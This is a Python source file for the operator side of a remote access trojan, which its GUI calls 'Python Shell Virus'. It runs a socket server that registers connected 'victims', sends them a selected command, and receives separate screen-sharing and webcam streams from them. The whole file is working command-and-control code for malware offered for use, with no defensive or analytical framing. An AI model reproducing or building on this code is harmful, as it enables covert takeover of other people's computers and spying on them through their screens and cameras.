import socket
import threading
import tkinter as tk
from tkinter.messagebox import showerror, showinfo

from constants import CHANNEL_TYPE_LEN, SCREEN_SHARE_CHANNEL, WEB_CAM_SHARE_CHANNEL
from host.classes.victim import Victim

class HostWithGui:

    # Manages the host abilities and the gui

    victimsList = [] # Contains all the connected victims

    def __init__(self, IP, PORT, opertaionListItems, startButtonCallAble, victimsList=[]):
        """
        param 1: the ip of the host
        param 2: the port of the host
        param 3: all the avaliable commands
        param 4: which function to call when the start button is clicked
        param 3: initial victims list

        param 1 type: str
        param 2 type: int
        param 3 type: list
        param 4 type: function
        param 5 type: list
        """

        self.IP = IP
        self.PORT = PORT
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # The gui template
        self.window = tk.Tk()
        self.window.title("Python Shell Virus")

        self.victimsListBox = victimsList
        self.startButtonCallAble = startButtonCallAble

        # for scrolling vertically
        yscrollbar = tk.Scrollbar(self.window)
        yscrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # Headers Labels
        tk.Label(text="Welcome To The Python Virus Shell!").pack()
        tk.Label(text="What Would You Like To Do?").pack()

        # Opertaion list
        variable = tk.StringVar(self.window)
        variable.set(opertaionListItems[0])  # default value
        opertaionList = tk.OptionMenu(
            self.window, variable, *opertaionListItems)

        opertaionList.pack()

        # Victims list
        self.victimsListBox = tk.Listbox(self.window, selectmode="single",
                                         yscrollcommand=yscrollbar.set)
        # Widget expands horizontally and
        # vertically by assigning both to
        # fill option
        self.victimsListBox.pack(padx=10, pady=10,
                                 expand=tk.YES, fill="both")
        x = list(self.victimsList)

        for each_item in range(len(x)):
            self.victimsListBox.insert(
                tk.END, x[each_item].commandsSocket.getsockname())
            self.victimsListBox.itemconfig(each_item, bg="lime")

        # Attach listbox to vertical scrollbar
        yscrollbar.config(command=self.victimsListBox.yview)

        # Start Button
        startBtn = tk.Button(
            text="Start!",
            command=lambda:  threading.Thread(target=self.startButtonOnClick, args=(
                variable.get(), self.victimsListBox.get(tk.ACTIVE))).start()

        )
        startBtn.pack()

    def buildGUI(self):
        """
        Builds the gui
        """
        self.window.mainloop()

    def startButtonOnClick(self, selectedOption, selectedVictimAddr):
        """
        Called when the start button is clicked

        param 1: the selected option (the command to executes)
        param 2: the socket address (IP, PORT) of the victim which the command will be exeucted on 
        
        param 1 type: str
        param 2 type: tuple
        """

        # Gets the victim object of the selected victim 
        selectedVictim = None
        for i in self.victimsList:
            if i.commandsSocket.getsockname() == selectedVictimAddr:
                selectedVictim = i
                break

        if selectedVictim == None:
            self.showError("Error", "Please choose a victim!")
        else:
            try:
                self.startButtonCallAble(selectedOption, selectedVictim)
            except socket.error:
                self._removeVictim(selectedVictim)

    def startServer(self):
        """
        Starts the server
        """

        self.socket.bind((self.IP, self.PORT))
        self.socket.listen()

        while True:
            victim = None
            victimSocket, victimAddr = self.socket.accept()

            
            # Read _matchVictimChannel method description to understand that...

            for i in self.victimsList:
                if i.IP == victimAddr[0]:
                    victim = i
                    break

            # If new Victim
            if victim == None:
                victim = Victim(commandsSocket=victimSocket)
                # Adds the new victim
                self._addVictim(victim)

            # If old victim
            else:
                threading.Thread(target=self._matchVictimChannel,
                                 args=(victim, victimSocket)).start()

    def _matchVictimChannel(self, victim, someSocket):
        """
        Our program works on channels (diffrent sockets connections)

        all the commands will be trafficed on the commands channel (some socket object)
        all the screen sharing data will be trafficed on the screen sharing channel (some another socket object)
        all the web camera wharing data will be trafficed on the web camera sharing channel (some another socket object)
        
        (Because we dont want the data will be mixed)

        If new vicitm is connected, the socket object will be the commands channel (becuase he is new - so it's must be that channel)
        but if we will send command to this victim to start sharing his screen, the victim will connect to us
        with another socket and start sharing the traffic.
        So this method has to understand if the new socket connection it's a new victim or just a new channel of an existing 
        victim.


        UPDATE: the [startServer] method is understanding by itself if the new socket object it's a new victim
        or just new channel, so this method only gets the new channel and has to understand which channel it's.
        and to save this channel to the [Victim] object of the victim 

        param 1: the victim object of the victim
        param 2: the new socket object (the new channel)

        param 1 type: Victim
        param 2 type: socket.socket
        """

        """
        When the victim is connecting with a new channel he notifies us what the channel type is by
        sending the channel type to us (so we just have to recive that)
        """
        channelType = someSocket.recv(CHANNEL_TYPE_LEN).decode()

        # We wants to update the object inside [self.victimsList] becuase [victim] is a copy not an pointer!

        victimIdx = 0
        for i in self.victimsList:
            if i == victim:
                victimIdx = self.victimsList.index(i)
                break

        if channelType == SCREEN_SHARE_CHANNEL:
            self.victimsList[victimIdx].screenShareSocket = someSocket

        elif channelType == WEB_CAM_SHARE_CHANNEL:
            self.victimsList[victimIdx].webCameraSocket = someSocket

    def _removeVictim(self, victim):
        """
        Removes victim from the program (for example if the victim is disconnected we have to remove him
        from our lists and gui)
        """
        
        # Removes victim to victims list
        self.victimsList.remove(victim)
        # Removes victim to victims listbox
        idx = self.victimsListBox.get(0, tk.END).index(
            victim.commandsSocket.getsockname())
        self.victimsListBox.delete(idx)

    def _addVictim(self, victim):
        """
        Adds a new victim to our program (for example if a new victim is connected we have to add him
        to our lists and gui)

        param 1: the victim
        param 1 type: Victim
        """

        # Adds victim to victims list
        self.victimsList.append(victim)
        # Adds victim to victims listbox
        self.victimsListBox.insert(tk.END, victim.commandsSocket.getsockname())

    def showError(self, title, desc):
        """
        Shows error dialog

        param 1: the title of the dialog
        param 2: the description of the dialog

        param 1 type: str
        param 2 type: str
        """

        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
        showerror(title, desc)

    def showInfo(self, title, desc):
        """
        Shows info dialog

        param 1: the title of the dialog
        param 2: the description of the dialog

        param 1 type: str
        param 2 type: str
        """

        tk.Tk().withdraw()  # TODO: check that becuase i saw this on the stackoverflow example
        showinfo(title, desc)
